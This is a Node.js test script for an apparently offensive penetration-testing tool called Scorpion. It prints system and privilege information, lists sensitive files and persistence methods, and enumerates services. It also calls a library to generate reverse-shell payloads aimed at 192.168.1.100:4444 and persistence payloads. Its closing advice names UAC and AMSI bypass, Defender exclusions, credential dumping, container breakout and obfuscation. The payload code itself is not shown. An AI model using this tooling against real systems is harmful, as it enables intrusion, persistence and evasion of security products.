#!/usr/bin/env node

import { CrossPlatformManager } from './cli/lib/cross-platform-manager.js';
import chalk from 'chalk';
import os from 'os';

console.log(chalk.cyan('🔍 Scorpion Cross-Platform Compatibility Test'));
console.log(chalk.cyan('=' .repeat(50)));

const platformManager = new CrossPlatformManager();
const platformInfo = platformManager.getCurrentPlatformInfo();

console.log(chalk.green('\n📋 System Information:'));
console.log(`Platform: ${chalk.yellow(platformInfo.platform)}`);
console.log(`Architecture: ${chalk.yellow(platformInfo.architecture)}`);
console.log(`OS Type: ${chalk.yellow(platformInfo.osType)}`);
console.log(`Release: ${chalk.yellow(platformInfo.release)}`);
console.log(`Home Directory: ${chalk.yellow(platformInfo.homeDirectory)}`);
console.log(`Temp Directory: ${chalk.yellow(platformInfo.tempDirectory)}`);
console.log(`Path Separator: ${chalk.yellow(platformInfo.pathSeparator)}`);

console.log(chalk.green('\n🎯 Platform Detection:'));
console.log(`Windows: ${platformInfo.isWindows ? chalk.green('✅') : chalk.red('❌')}`);
console.log(`macOS: ${platformInfo.isMacOS ? chalk.green('✅') : chalk.red('❌')}`);
console.log(`Linux: ${platformInfo.isLinux ? chalk.green('✅') : chalk.red('❌')}`);
console.log(`Unix-like: ${platformInfo.isUnix ? chalk.green('✅') : chalk.red('❌')}`);

console.log(chalk.green('\n⚡ Platform Capabilities:'));
const caps = platformInfo.capabilities;
if (caps) {
  console.log(`Shell: ${chalk.yellow(caps.shell)}`);
  console.log(`Package Manager: ${chalk.yellow(caps.packageManager)}`);
  console.log(`Admin Command: ${chalk.yellow(caps.adminCommand)}`);
  console.log(`Script Extension: ${chalk.yellow(caps.scriptExtension)}`);
  console.log(`Executable Extension: ${chalk.yellow(caps.executableExtension)}`);
  
  console.log(chalk.green('\n📁 System Paths:'));
  caps.systemPaths.forEach(path => console.log(`  • ${chalk.cyan(path)}`));
  
  console.log(chalk.green('\n🔐 Sensitive Files:'));
  caps.sensitiveFiles.forEach(file => console.log(`  • ${chalk.red(file)}`));
  
  console.log(chalk.green('\n🚪 Exploit Paths:'));
  caps.exploitPaths.forEach(path => console.log(`  • ${chalk.yellow(path)}`));
  
  console.log(chalk.green('\n⚙️ Persistence Methods:'));
  caps.persistenceMethods.forEach(method => console.log(`  • ${chalk.blue(method)}`));
}

console.log(chalk.green('\n🧪 Command Testing:'));

async function testCommands() {
  try {
    // Test network commands
    console.log(chalk.blue('Network Commands:'));
    const pingCmd = platformManager.getNetworkCommand('ping');
    if (pingCmd) {
      console.log(`  Ping: ${chalk.green(pingCmd)}`);
      const pingResult = await platformManager.executeCommand(`${pingCmd} 127.0.0.1`);
      console.log(`  Status: ${pingResult.success ? chalk.green('✅ Working') : chalk.red('❌ Failed')}`);
    }
    
    const netstatCmd = platformManager.getNetworkCommand('netstat');
    if (netstatCmd) {
      console.log(`  Netstat: ${chalk.green(netstatCmd)}`);
    }
    
    // Test system commands
    console.log(chalk.blue('\nSystem Commands:'));
    const whoamiCmd = platformManager.getSystemCommand('whoami');
    if (whoamiCmd) {
      console.log(`  Whoami: ${chalk.green(whoamiCmd)}`);
      const whoamiResult = await platformManager.executeCommand(whoamiCmd);
      if (whoamiResult.success) {
        console.log(`  Current User: ${chalk.yellow(whoamiResult.stdout.trim())}`);
      }
    }
    
    const hostnameCmd = platformManager.getSystemCommand('hostname');
    if (hostnameCmd) {
      console.log(`  Hostname: ${chalk.green(hostnameCmd)}`);
      const hostnameResult = await platformManager.executeCommand(hostnameCmd);
      if (hostnameResult.success) {
        console.log(`  System Name: ${chalk.yellow(hostnameResult.stdout.trim())}`);
      }
    }
    
    // Test privilege level
    console.log(chalk.blue('\n🔒 Privilege Testing:'));
    const isElevated = await platformManager.isElevated();
    console.log(`  Elevated Privileges: ${isElevated ? chalk.red('✅ YES (Admin/Root)') : chalk.green('❌ NO (Standard User)')}`);
    
    // Test payload generation
    console.log(chalk.blue('\n💉 Payload Generation Test:'));
    const reverseShell = await platformManager.createPlatformSpecificPayload('reverse_shell', {
      ip: '192.168.1.100',
      port: 4444
    });
    
    if (reverseShell) {
      console.log(`  Reverse Shell Payloads: ${chalk.green('✅ Generated')}`);
      Object.keys(reverseShell).forEach(key => {
        console.log(`    ${chalk.cyan(key)}: ${chalk.gray(reverseShell[key].substring(0, 60) + '...')}`);
      });
    }
    
    const persistence = await platformManager.createPlatformSpecificPayload('persistence', {
      command: 'calc.exe'
    });
    
    if (persistence) {
      console.log(`  Persistence Payloads: ${chalk.green('✅ Generated')}`);
      Object.keys(persistence).forEach(key => {
        console.log(`    ${chalk.cyan(key)}: Available`);
      });
    }
    
    // Test system information gathering
    console.log(chalk.blue('\n📊 System Information Gathering:'));
    console.log('  Gathering detailed system info...');
    const systemInfo = await platformManager.getSystemInformation();
    
    console.log(`  Hostname: ${chalk.yellow(systemInfo.hostname || 'Unknown')}`);
    console.log(`  Username: ${chalk.yellow(systemInfo.username || 'Unknown')}`);
    console.log(`  OS Version: ${chalk.yellow(systemInfo.osVersion || 'Unknown')}`);
    console.log(`  Network Interfaces: ${chalk.green(systemInfo.networkInterfaces.length)} found`);
    
    if (systemInfo.networkInterfaces.length > 0) {
      systemInfo.networkInterfaces.forEach(iface => {
        console.log(`    • ${chalk.cyan(iface.name)}: ${chalk.yellow(iface.ip)}`);
      });
    }
    
    // Test service detection
    console.log(chalk.blue('\n🔧 Service Detection:'));
    console.log('  Detecting running services...');
    const services = await platformManager.detectRunningServices();
    console.log(`  Running Services: ${chalk.green(services.length)} detected`);
    
    if (services.length > 0) {
      services.slice(0, 10).forEach(service => {
        console.log(`    • ${chalk.cyan(service.name)}`);
      });
      if (services.length > 10) {
        console.log(`    ... and ${chalk.yellow(services.length - 10)} more`);
      }
    }
    
  } catch (error) {
    console.log(chalk.red(`❌ Error during testing: ${error.message}`));
  }
}

// CPU and Memory Info
console.log(chalk.green('\n💻 Hardware Information:'));
console.log(`CPUs: ${chalk.yellow(os.cpus().length)} cores`);
console.log(`Total Memory: ${chalk.yellow(Math.round(os.totalmem() / 1024 / 1024 / 1024))} GB`);
console.log(`Free Memory: ${chalk.yellow(Math.round(os.freemem() / 1024 / 1024 / 1024))} GB`);
console.log(`Uptime: ${chalk.yellow(Math.round(os.uptime() / 3600))} hours`);

// Network Interfaces
console.log(chalk.green('\n🌐 Network Interfaces:'));
const networkInterfaces = os.networkInterfaces();
Object.keys(networkInterfaces).forEach(interfaceName => {
  const addresses = networkInterfaces[interfaceName];
  addresses.forEach(addr => {
    if (addr.family === 'IPv4' && !addr.internal) {
      console.log(`  ${chalk.cyan(interfaceName)}: ${chalk.yellow(addr.address)}`);
    }
  });
});

await testCommands();

console.log(chalk.green('\n✅ Cross-Platform Compatibility Test Complete!'));
console.log(chalk.cyan('=' .repeat(50)));

// Platform-specific recommendations
console.log(chalk.blue('\n💡 Platform-Specific Recommendations:'));

if (platformInfo.isWindows) {
  console.log(chalk.yellow('Windows Platform Detected:'));
  console.log('  • Use PowerShell for advanced commands');
  console.log('  • Consider UAC bypass techniques');
  console.log('  • Registry persistence methods available');
  console.log('  • Windows Defender exclusions may be needed');
  console.log('  • AMSI bypass for PowerShell payloads');
} else if (platformInfo.isMacOS) {
  console.log(chalk.yellow('macOS Platform Detected:'));
  console.log('  • Use LaunchAgents/LaunchDaemons for persistence');
  console.log('  • Consider Gatekeeper and SIP protections');
  console.log('  • Keychain access for credential dumping');
  console.log('  • AppleScript for privilege escalation');
  console.log('  • codesign requirements for executables');
} else if (platformInfo.isLinux) {
  console.log(chalk.yellow('Linux Platform Detected:'));
  console.log('  • Use cron jobs or systemd for persistence');
  console.log('  • Check for SUID binaries for privesc');
  console.log('  • Container breakout techniques available');
  console.log('  • SSH key injection for persistence');
  console.log('  • SELinux/AppArmor may restrict actions');
}

console.log(chalk.green('\n🔐 Security Recommendations:'));
console.log('  • Always test on authorized systems only');
console.log('  • Use appropriate payload encoding/obfuscation');
console.log('  • Implement proper cleanup procedures');
console.log('  • Monitor for security product detections');
console.log('  • Follow responsible disclosure practices');